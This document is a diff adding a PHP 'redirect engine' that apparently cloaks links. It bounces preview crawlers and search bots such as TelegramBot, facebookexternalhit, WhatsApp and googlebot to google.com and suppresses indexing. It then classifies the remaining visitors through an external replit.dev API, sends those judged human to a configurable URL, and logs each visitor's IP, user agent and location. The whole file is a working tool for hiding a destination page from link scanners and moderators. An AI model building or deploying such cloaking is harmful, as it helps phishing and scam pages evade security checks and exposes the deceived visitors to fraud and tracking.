@@ -1,0 +1,306 @@
+<?php
+/**
+ * CleanTraffic PHP Protection - Redirect Engine
+ * 
+ * Advanced visitor classification and redirection system
+ * Integrates with CleanTraffic API for accurate bot detection
+ * 
+ * Features:
+ * - Anti-crawling protection
+ * - Real-time visitor classification
+ * - Automatic redirection based on visitor type
+ * - Comprehensive logging
+ */
+
+// Start session for potential admin logging
+session_start();
+
+// SECURITY: Prevent any preview generation or crawling
+header('X-Robots-Tag: noindex, nofollow, nosnippet, noarchive, noimageindex');
+header('Cache-Control: no-cache, no-store, must-revalidate');
+header('Pragma: no-cache');
+header('Expires: 0');
+
+// Configuration
+$CLEANTRAFFIC_API_ENDPOINT = 'https://b5c9b90c-2b1a-4515-8f6e-08614985a083-00-1nd7hrl46szbn.worf.replit.dev/api/classify';
+$DEFAULT_BOT_URL = 'https://google.com';
+$DEFAULT_HUMAN_URL = 'https://example.com';
+$VISITORS_FILE = __DIR__ . '/visitors.json';
+$REDIRECT_URL_FILE = __DIR__ . '/redirect_url.txt';
+$BOT_URL_FILE = __DIR__ . '/bot_url.txt';
+$API_KEY_FILE = __DIR__ . '/api_key.txt';
+$MAX_RETRIES = 3;
+
+// ANTI-CRAWLING: Immediate bot detection for social media crawlers
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$socialCrawlers = [
+    'TelegramBot', 'facebookexternalhit', 'Twitterbot', 'WhatsApp',
+    'LinkedInBot', 'SkypeUriPreview', 'SlackBot', 'DiscordBot',
+    'applebot', 'googlebot', 'bingbot', 'yandexbot'
+];
+
+foreach ($socialCrawlers as $crawler) {
+    if (stripos($userAgent, $crawler) !== false) {
+        // Immediate redirect for social media crawlers
+        header('Location: ' . $DEFAULT_BOT_URL, true, 301);
+        exit();
+    }
+}
+
+/**
+ * Extract visitor's real IP address using multiple fallback methods
+ */
+function getVisitorIP() {
+    $headers = [
+        'HTTP_CF_CONNECTING_IP',     // Cloudflare
+        'HTTP_X_FORWARDED_FOR',      // Load balancer/proxy
+        'HTTP_X_FORWARDED',          // Proxy
+        'HTTP_X_CLUSTER_CLIENT_IP',  // Cluster
+        'HTTP_CLIENT_IP',            // Proxy
+        'HTTP_FORWARDED_FOR',        // Proxy
+        'HTTP_FORWARDED',            // Proxy
+        'REMOTE_ADDR'                // Direct connection
+    ];
+    
+    foreach ($headers as $header) {
+        if (!empty($_SERVER[$header])) {
+            $ips = explode(',', $_SERVER[$header]);
+            $ip = trim($ips[0]);
+            
+            // Validate IP address
+            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+                return $ip;
+            }
+        }
+    }
+    
+    // Fallback to REMOTE_ADDR even if private
+    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+}
+
+/**
+ * Local bot detection using User-Agent analysis
+ */
+function analyzeUserAgent($userAgent) {
+    $userAgent = strtolower($userAgent);
+    
+    // Browser detection
+    $browser = 'Unknown';
+    if (strpos($userAgent, 'chrome') !== false && strpos($userAgent, 'edg') === false) {
+        $browser = 'Chrome';
+    } elseif (strpos($userAgent, 'firefox') !== false) {
+        $browser = 'Firefox';
+    } elseif (strpos($userAgent, 'safari') !== false && strpos($userAgent, 'chrome') === false) {
+        $browser = 'Safari';
+    } elseif (strpos($userAgent, 'edg') !== false) {
+        $browser = 'Edge';
+    } elseif (strpos($userAgent, 'trident') !== false || strpos($userAgent, 'msie') !== false) {
+        $browser = 'Internet Explorer';
+    }
+    
+    // Device type detection
+    $device = 'Unknown';
+    if (strpos($userAgent, 'mobile') !== false || strpos($userAgent, 'android') !== false || 
+        strpos($userAgent, 'iphone') !== false || strpos($userAgent, 'ipad') !== false) {
+        $device = 'Mobile';
+    } elseif (strpos($userAgent, 'windows') !== false || strpos($userAgent, 'macintosh') !== false || 
+             strpos($userAgent, 'linux') !== false) {
+        $device = 'Desktop';
+    }
+    
+    // Bot detection logic
+    $isBot = ($browser === 'Unknown' || $device === 'Unknown');
+    
+    return [
+        'browser' => $browser,
+        'device' => $device,
+        'isBot' => $isBot
+    ];
+}
+
+/**
+ * Classify visitor using CleanTraffic API
+ */
+function classifyVisitorAPI($ip, $userAgent) {
+    global $CLEANTRAFFIC_API_ENDPOINT, $API_KEY_FILE, $MAX_RETRIES;
+    
+    // Get API key
+    if (!file_exists($API_KEY_FILE)) {
+        return null;
+    }
+    
+    $apiKey = trim(file_get_contents($API_KEY_FILE));
+    if (empty($apiKey)) {
+        return null;
+    }
+    
+    $data = json_encode([
+        'ip' => $ip,
+        'user_agent' => $userAgent
+    ]);
+    
+    for ($attempt = 1; $attempt <= $MAX_RETRIES; $attempt++) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $CLEANTRAFFIC_API_ENDPOINT,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_HTTPHEADER => [
+                'Content-Type: application/json',
+                'X-API-Key: ' . $apiKey,
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept: application/json',
+                'Cache-Control: no-cache'
+            ],
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_FOLLOWLOCATION => false,
+            CURLOPT_MAXREDIRS => 0
+        ]);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($response !== false && $httpCode === 200) {
+            $result = json_decode($response, true);
+            if ($result && isset($result['classification'])) {
+                return $result;
+            }
+        }
+        
+        // If this is the last attempt or a non-retriable error, break
+        if ($attempt === $MAX_RETRIES || $httpCode === 401 || $httpCode === 403) {
+            break;
+        }
+        
+        // Wait before retry
+        usleep(100000); // 0.1 second
+    }
+    
+    return null;
+}
+
+/**
+ * Log visitor data
+ */
+function logVisitor($ip, $userAgent, $classification, $location, $browser, $device) {
+    global $VISITORS_FILE;
+    
+    $visitorData = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'ip' => $ip,
+        'user_agent' => $userAgent,
+        'classification' => $classification,
+        'location' => $location,
+        'browser' => $browser,
+        'device' => $device
+    ];
+    
+    // Load existing visitors
+    $visitors = [];
+    if (file_exists($VISITORS_FILE)) {
+        $content = file_get_contents($VISITORS_FILE);
+        if ($content) {
+            $visitors = json_decode($content, true) ?? [];
+        }
+    }
+    
+    // Add new visitor
+    $visitors[] = $visitorData;
+    
+    // Keep only last 1000 visitors to prevent file from growing too large
+    if (count($visitors) > 1000) {
+        $visitors = array_slice($visitors, -1000);
+    }
+    
+    // Save back to file
+    file_put_contents($VISITORS_FILE, json_encode($visitors, JSON_PRETTY_PRINT));
+}
+
+/**
+ * Get redirect URLs from configuration
+ */
+function getRedirectUrls() {
+    global $DEFAULT_HUMAN_URL, $DEFAULT_BOT_URL, $REDIRECT_URL_FILE, $BOT_URL_FILE;
+    
+    $humanUrl = $DEFAULT_HUMAN_URL;
+    $botUrl = $DEFAULT_BOT_URL;
+    
+    if (file_exists($REDIRECT_URL_FILE)) {
+        $configuredHuman = trim(file_get_contents($REDIRECT_URL_FILE));
+        if (!empty($configuredHuman)) {
+            $humanUrl = $configuredHuman;
+        }
+    }
+    
+    if (file_exists($BOT_URL_FILE)) {
+        $configuredBot = trim(file_get_contents($BOT_URL_FILE));
+        if (!empty($configuredBot)) {
+            $botUrl = $configuredBot;
+        }
+    }
+    
+    return [$humanUrl, $botUrl];
+}
+
+// Main execution
+try {
+    // Extract visitor information
+    $ip = getVisitorIP();
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    // Local pre-screening
+    $localAnalysis = analyzeUserAgent($userAgent);
+    
+    // Default classification
+    $classification = 'bot';
+    $location = 'Unknown';
+    $confidence = 0.5;
+    
+    // If local analysis suggests bot, skip API call
+    if ($localAnalysis['isBot']) {
+        $classification = 'bot';
+    } else {
+        // Use CleanTraffic API for detailed analysis
+        $apiResult = classifyVisitorAPI($ip, $userAgent);
+        
+        if ($apiResult) {
+            $classification = $apiResult['classification'] ?? 'bot';
+            $location = $apiResult['location'] ?? 'Unknown';
+            $confidence = $apiResult['confidence'] ?? 0.5;
+        }
+    }
+    
+    // Log the visitor
+    logVisitor(
+        $ip, 
+        $userAgent, 
+        $classification, 
+        $location, 
+        $localAnalysis['browser'], 
+        $localAnalysis['device']
+    );
+    
+    // Get redirect URLs
+    list($humanUrl, $botUrl) = getRedirectUrls();
+    
+    // Perform redirection
+    if ($classification === 'human') {
+        header('Location: ' . $humanUrl, true, 302);
+    } else {
+        header('Location: ' . $botUrl, true, 302);
+    }
+    
+} catch (Exception $e) {
+    // Fallback: redirect to bot URL on any error
+    error_log('CleanTraffic Error: ' . $e->getMessage());
+    list($humanUrl, $botUrl) = getRedirectUrls();
+    header('Location: ' . $botUrl, true, 302);
+}
+
+exit();
+?>
